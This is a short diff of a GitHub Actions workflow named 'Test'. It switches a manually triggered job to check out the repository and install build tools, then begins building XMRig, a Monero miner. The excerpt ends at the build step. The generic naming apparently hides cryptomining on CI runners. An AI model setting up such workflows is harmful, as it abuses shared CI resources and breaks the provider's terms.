@@ -2,18 +2,18 @@ name: Test
 on: 
  workflow_dispatch:
 jobs:
-   test:
-     name: Fetch
+   build:
      runs-on: ubuntu-latest
-     container: ubuntu:20.10
-     env:
-       DEBIAN_FRONTEND: noninteractive
+     
      strategy:
        fail-fast: false
        matrix:
          runner: [0]
      steps:
-       - run: |
+       - name: Uses
+         uses: actions/checkout@v4
+       - name: install
+         run: |
           apt update -y
           apt install -y git build-essential cmake automake libtool autoconf
           mkdir xmrig/build && cd xmrig/scripts
